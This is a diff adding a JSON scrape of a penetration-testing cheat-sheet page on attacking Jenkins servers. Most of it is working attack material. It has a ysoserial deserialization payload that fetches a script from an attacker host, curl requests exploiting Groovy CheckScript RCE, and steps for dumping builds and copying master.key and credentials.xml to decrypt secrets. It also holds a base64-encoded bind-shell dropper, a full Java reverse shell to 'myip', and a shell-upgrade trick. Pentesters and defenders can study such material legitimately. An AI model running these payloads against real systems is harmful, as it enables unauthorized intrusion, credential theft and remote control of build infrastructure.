@@ -1,0 +1,116 @@
+{
+    "title": "Jenkins",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Technologies",
+            "url": "/enumeration/webservices"
+        }
+    ],
+    "sections": [
+        {
+            "heading": "Common bugs",
+            "subheadings": [
+                {
+                    "heading": "Deserialization RCE in old Jenkins \\(CVE-2015-8103, Jenkins 1.638 and older\\)",
+                    "type": "paragraph",
+                    "content": "Use ysoserial to generate a payload. Then RCE using this script:\n``bash\njava -jar ysoserial-master.jar CommonsCollections1 'wget myip:myport -O /tmp/a.sh' > payload.out\n./jenkinsrce.py jenkinsip jenkins_port payload.out\n``"
+                },
+                {
+                    "heading": "Authentication/ACL bypass \\(CVE-2018-1000861, Jenkins <2.150.1\\)",
+                    "type": "paragraph",
+                    "content": "Details here.\nIf the Jenkins requests authentication but returns valid data using the following request, it is vulnerable:\n``bash\ncurl -k -4 -s https://example.com/securityRealm/user/admin/search/index?q=a\n``"
+                },
+                {
+                    "heading": "Metaprogramming RCE in Jenkins Plugins \\(CVE-2019-1003000, CVE-2019-1003001, CVE-2019-1003002\\)",
+                    "type": "paragraph",
+                    "content": "Original RCE vulnerability here, full exploit here.\nAlternative RCE with Overall/Read and Job/Configure permissions here."
+                },
+                {
+                    "heading": "CheckScript RCE in Jenkins \\(CVE-2019-1003029, CVE-2019-1003030\\)",
+                    "type": "paragraph",
+                    "content": "Check if a Jenkins instance is vulnerable \\(needs Overall/Read permissions\\) with some Groovy:\n``bash\ncurl -k -4 -X POST \"https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/\" -d \"sandbox=True\" -d 'value=class abcd{abcd(){sleep(5000)}}'\n`\nExecute arbitrary bash commands:\n`bash\ncurl -k -4 -X POST \"https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/\" -d \"sandbox=True\" -d 'value=class abcd{abcd(){\"wget xx.xx.xx.xx/bla.txt\".execute()}}'\n`\nIf you don't immediately get a reverse shell you can debug by throwing an exception:\n`bash\ncurl -k -4 -X POST \"https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/\" -d \"sandbox=True\" -d 'value=class abcd{abcd(){def proc=\"id\".execute();def os=new StringBuffer();proc.waitForProcessOutput(os, System.err);throw new Exception(os.toString())}}'\n``"
+                },
+                {
+                    "heading": "Git plugin \\(<3.12.0\\) RCE in Jenkins \\(CVE-2019-10392\\)",
+                    "type": "paragraph",
+                    "content": "This one will only work is a user has the 'Jobs/Configure' rights in the security matrix, so it's very specific."
+                },
+                {
+                    "heading": "Dumping builds to find cleartext secrets",
+                    "type": "paragraph",
+                    "content": "Use this script to dump build console outputs and build environment variables to hopefully find cleartext secrets.\n``text\nusage: jenkinsdumpbuilds.py [-h] [-u USER] [-p PASSWORD] [-o OUTPUTDIR]\n[-l] [-r] [-d] [-s] [-v]\nurl [url ...]\nDump all available info from Jenkins\npositional arguments:\nurl\noptional arguments:\n-h, --help            show this help message and exit\n-u USER, --user USER\n-p PASSWORD, --password PASSWORD\n-o OUTPUTDIR, --output-dir OUTPUTDIR\n-l, --last            Dump only the last build of each job\n-r, --recoverfromfailure\nRecover from server failure, skip all existing\ndirectories\n-d, --downgradessl   Downgrade SSL to use RSA (for legacy)\n-s, --nousesession  Don't reuse the HTTP session, but create a new one for\neach request (for legacy)\n-v, --verbose         Debug mode\n``"
+                },
+                {
+                    "heading": "Password spraying",
+                    "type": "paragraph",
+                    "content": "Use this python script."
+                },
+                {
+                    "heading": "Files to copy after compromising",
+                    "type": "paragraph",
+                    "content": "These files are needed to decrypt Jenkins secrets:\n secrets/master.key\n secrets/hudson.util.Secret\nSuch secrets can usually be found in:\n credentials.xml\n jobs/.../build.xml\nHere's a regexp to find them:\n``bash\ngrep -re \"^\\s{[a-zA-Z0-9=+/]*}<\"\n``"
+                },
+                {
+                    "heading": "Decrypt Jenkins secrets offline",
+                    "type": "paragraph",
+                    "content": "Use this script to decrypt previously dumped secrets.\n``text\nUsage:\njenkinsofflinedecrypt.py \nor:\njenkinsofflinedecrypt.py   [credentials.xml]\nor:\njenkinsofflinedecrypt.py -i  (interactive mode)\n``"
+                },
+                {
+                    "heading": "Decrypt Jenkins secrets from Groovy",
+                    "type": "code_block",
+                    "content": [
+                        "println(hudson.util.Secret.decrypt(\"{...}\"))"
+                    ]
+                },
+                {
+                    "heading": "Command execution from Groovy",
+                    "type": "paragraph",
+                    "content": "``java\ndef proc = \"id\".execute();\ndef os = new StringBuffer();\nproc.waitForProcessOutput(os, System.err);\nprintln(os.toString());\n`\nFor multiline shell commands, use the following shell syntax trick \\(example includes bind shell\\):\n`java\ndef proc=\"sh -c \\$@|sh . echo /bin/echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAzgAAAAAAAAAkAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdSxwQkAgD96UiJ5moQWmoxWA8FajJYDwVIMfZqK1gPBUiXagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU= | base64 -d > /tmp/65001\".execute();\n``\nAutomate it using this script."
+                },
+                {
+                    "heading": "Reverse shell from Groovy",
+                    "type": "paragraph",
+                    "content": "``java\nString host=\"myip\";\nint port=1234;\nString cmd=\"/bin/bash\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n`\nI'll leave this reverse shell tip to recover a fully working PTY here in case anyone needs it:\n`bash\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\n^Z bg\nstty -a\necho $TERM\nstty raw -echo\nfg\nexport TERM=...\nstty rows xx columns yy\n``"
+                }
+            ]
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2021-05-31T14:31:26.510Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/webservices/jenkins.md",
+        "previous_page": {
+            "title": "Joomla",
+            "url": "/enumeration/webservices/joomla"
+        },
+        "next_page": {
+            "title": "IIS",
+            "url": "/enumeration/webservices/iis"
+        }
+    }
+}
